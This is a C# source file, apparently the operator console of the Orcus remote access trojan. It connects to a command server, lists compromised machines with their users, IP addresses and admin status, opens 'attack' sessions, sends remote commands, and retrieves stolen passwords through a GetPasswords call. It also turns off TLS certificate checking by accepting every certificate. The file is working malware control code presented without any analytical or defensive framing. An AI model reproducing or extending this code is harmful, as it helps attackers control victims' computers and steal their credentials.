using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Commands.Password;
using System.Threading;
using Orcus.Shared.DataTransferProtocol;
using Orcus.Shared.DynamicCommands;

namespace Orcus.Administration.App
{
	public class ConnectionManager : IDisposable
	{
		private readonly TcpClient _tcpClient;
		private readonly Func<byte> _readByteDelegate;
		private bool _isDisposed;
		private readonly object _clientListLock = new object();
		private const int ApiVersion = 8;

		private ConnectionManager(BinaryReader binaryReader, BinaryWriter binaryWriter, SslStream sslStream, TcpClient tcpClient)
		{
			DataTransferProtocolFactory = new DtpFactory (SendData);
			Sender = new Sender(binaryReader, binaryWriter, sslStream);
			StaticCommander = new StaticCommander(this);

			_tcpClient = tcpClient;

			var serializer = new Serializer(new[] {typeof (WelcomePackage)});
			var welcomePackage = (WelcomePackage) serializer.Deserialize(sslStream);

			_readByteDelegate += Sender.BinaryReader.ReadByte;
			_readByteDelegate.BeginInvoke(EndRead, null);

			var lightInfo = DataTransferProtocolFactory.ExecuteFunction<LightInformationApp> ("GetAllClientsLightApp");
			Clients = lightInfo.Clients.Select(x => {
				x.Group = lightInfo.Groups[x.GroupId];
				x.OsName = lightInfo.OperatingSystems[x.OsNameId];
				return x;
			}).ToList();
		}

		public void Dispose()
		{
			if (_isDisposed)
				return;

			_isDisposed = true;
			Sender.Dispose();
			_tcpClient.Close();
			if (CurrentController != null)
				CurrentController.Dispose ();
		}

		public event EventHandler AttackOpened;
		public event EventHandler Disconnected;
		public event EventHandler ClientListChanged;
		public event EventHandler<LightClientInformationApp> ClientDisconnected;
		public event EventHandler<OnlineClientInformation> ClientConnected;

		public List<LightClientInformationApp> Clients { get; private set; }
		public ClientController CurrentController { get; set; }
		public Sender Sender { get; private set; }
		public static ConnectionManager Current { get; private set; }
		public StaticCommander StaticCommander { get; private set; }

		public DtpFactory DataTransferProtocolFactory { get; private set;}

		private void EndRead(IAsyncResult asyncResult)
		{
			try
			{
				var parameter = _readByteDelegate.EndInvoke(asyncResult);
				var size = Sender.BinaryReader.ReadInt32();
				var bytes = Sender.BinaryReader.ReadBytes(size);

				switch ((FromClientPackage) parameter)
				{
				case FromClientPackage.ResponseToAdministration:
				case FromClientPackage.ResponseToAdministrationCompressed:
					var data = parameter == (byte) FromClientPackage.ResponseToAdministrationCompressed
						? LZF.Decompress(bytes, 1)
						: bytes.Skip(1).ToArray();

					if(CurrentController != null)
						CurrentController.PackageReceived(bytes[0], data);
					break;
				case FromClientPackage.ResponseLoginOpen:
					var clientId = BitConverter.ToInt32(bytes, 0);
					var client = Clients.FirstOrDefault(x => x.Id == clientId);
					if (client == null)
						break;

					CurrentController = new ClientController(client, _tcpClient, Sender);
					if(AttackOpened != null)
						AttackOpened.Invoke(this, EventArgs.Empty);
					break;
				case FromClientPackage.NewClientConnected:
					lock (_clientListLock) {
						ConnectClient(new Serializer(new[] {typeof (ClientInformation), typeof (OnlineClientInformation)}).Deserialize<OnlineClientInformation>(bytes));
					}
					break;
				case FromClientPackage.ClientConnected:
					lock (_clientListLock) {
						ConnectClient(new Serializer(new[] {typeof (ClientInformation), typeof (OnlineClientInformation)}).Deserialize<OnlineClientInformation>(bytes));
					}
					break;
				case FromClientPackage.ClientDisconnected:
					lock (_clientListLock) {
						var disconnectedClientId = BitConverter.ToInt32(bytes, 0);
						var disconnectedClient =
							Clients
								.FirstOrDefault(x => x.Id == disconnectedClientId);
						if (disconnectedClient == null)
							break;

						if (CurrentController != null && CurrentController.Client == disconnectedClient)
						{
							CurrentController.Dispose();
							CurrentController = null;
						}

						Clients.Remove(disconnectedClient);

						if(ClientListChanged != null)
							ClientListChanged.Invoke(this, EventArgs.Empty);

						if(ClientDisconnected != null)
							ClientDisconnected.Invoke(this, disconnectedClient);
					}
					break;
				case FromClientPackage.DataTransferProtocolResponse:
					DataTransferProtocolFactory.Receive(bytes);
					break;
				default:
					break;
				}

				_readByteDelegate.BeginInvoke(EndRead, null);
			}
			catch (Exception)
			{
				Dispose();
				if (Disconnected != null)
					Disconnected.Invoke (this, EventArgs.Empty);
			}
		}

		private void SendData(byte[] data)
		{
			lock (Sender.WriterLock)
			{
				Sender.BinaryWriter.Write((byte) FromAdministrationPackage.DataTransferProtocol);
				Sender.BinaryWriter.Write(data.Length);
				Sender.BinaryWriter.Write(data);
			}
		}

		private void ConnectClient(OnlineClientInformation clientInformation){
			var existingClient = Clients.FirstOrDefault(x => x.Id == clientInformation.Id);
			var clientInfo = new LightClientInformationApp {
				Id = clientInformation.Id,
				UserName = clientInformation.UserName,
				OsType = clientInformation.OsType,
				ApiVersion = clientInformation.ApiVersion,
				IsAdministrator = clientInformation.IsAdministrator,
				IsServiceRunning = clientInformation.IsServiceRunning,
				IpAddress = clientInformation.IpAddress,
				OnlineSince = clientInformation.OnlineSince,
				Language = clientInformation.Language,
				IsOnline = clientInformation.IsOnline,
				Group = clientInformation.Group,
				OsName = clientInformation.OsName
			};

			if(existingClient == null)
			{
				Clients.Add (clientInfo);
			}
			else {
				Clients[Clients.IndexOf(existingClient)] = clientInfo;
			}

			if(ClientListChanged != null)
				ClientListChanged.Invoke(this, EventArgs.Empty);

			if (ClientConnected != null)
				ClientConnected.Invoke (this, clientInformation);
		}

		public void LogIn(int id)
		{
			lock (Sender.WriterLock)
			{
				Sender.BinaryWriter.Write((byte) FromAdministrationPackage.InitializeNewSession);
				Sender.BinaryWriter.Write(4);
				Sender.BinaryWriter.Write(BitConverter.GetBytes(id));
			}
		}

		public void SendCommand(DynamicCommand dynamicCommand)
		{
			var serializer = new Serializer(DynamicCommand.RequiredTypes);
			Sender.SendDynamicCommand(serializer.Serialize(dynamicCommand));
		}

		public PasswordData GetPasswords(BaseClientInformation client)
		{
			return DataTransferProtocolFactory.ExecuteFunction<PasswordData>("GetPasswords", client.Id);
		}

		public static ConnectionResult ConnectToServer(string ip, int port, string password, Action<string> statusUpdate)
		{
			TcpClient client;
			SslStream stream;

			if (TryConnect(out client, out stream, ip, port))
			{
				var binaryWriter = new BinaryWriter(stream);
				var binaryReader = new BinaryReader(stream);
				int serverApiVersion;
				statusUpdate.Invoke ("Version check");
				if (!ApiVersionCheck(binaryReader, binaryWriter, out serverApiVersion))
				{
					binaryReader.Dispose();
					binaryWriter.Dispose();
					stream.Dispose();
					client.Close();
					return ConnectionResult.InvalidVersion;
				}

				statusUpdate.Invoke ("Authenticate");
				if (Authenticate(binaryReader, binaryWriter, password))
				{
					Current = new ConnectionManager(binaryReader, binaryWriter, stream, client);
					statusUpdate.Invoke ("Success");
					return ConnectionResult.Awesome;
				}

				binaryReader.Dispose();
				binaryWriter.Dispose();
				stream.Dispose();
				client.Close();
				return ConnectionResult.AuthenticateException;
			}

			return ConnectionResult.ServerNotResponsing;
		}

		private static bool ApiVersionCheck(BinaryReader binaryReader, BinaryWriter binaryWriter, out int serverApiVersion)
		{
			serverApiVersion = -1;
			binaryWriter.Write(ApiVersion);
			var awesome = (AuthentificationFeedback) binaryReader.ReadByte() ==
				AuthentificationFeedback.ApiVersionOkayGetPassword;
			if (awesome)
				return true;

			serverApiVersion = binaryReader.ReadInt32();
			return false;
		}

		private static bool Authenticate(BinaryReader binaryReader, BinaryWriter binaryWriter, string password)
		{
			binaryWriter.Write(password);
			return binaryReader.ReadByte() == (byte) AuthentificationFeedback.Accepted;
		}

		private static bool TryConnect(out TcpClient tcpClient, out SslStream stream, string ip, int port)
		{
			tcpClient = null;
			stream = null;

			var client = new TcpClient();
			try
			{
				var result = client.BeginConnect(ip, port, null, null);
				var success = result.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(3));

				if (!success)
					return false;

				// we are connected
				client.EndConnect(result);
			}
			catch (Exception)
			{
				return false;
			}

			var sslStream = new SslStream(client.GetStream(), false, UserCertificateValidationCallback);

			try
			{
				var serverName = Environment.MachineName;
				sslStream.AuthenticateAsClient(serverName);
			}
			catch (AuthenticationException)
			{
				sslStream.Dispose();
				client.Close();
				return false;
			}

			sslStream.Write(new[] {(byte) AuthentificationIntention.Administration});

			tcpClient = client;
			stream = sslStream;
			return true;
		}

		private static bool UserCertificateValidationCallback(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
		{
			return true;
		}
	}

	public enum ConnectionResult
	{
		Awesome,
		AuthenticateException,
		ServerNotResponsing,
		InvalidVersion
	}
}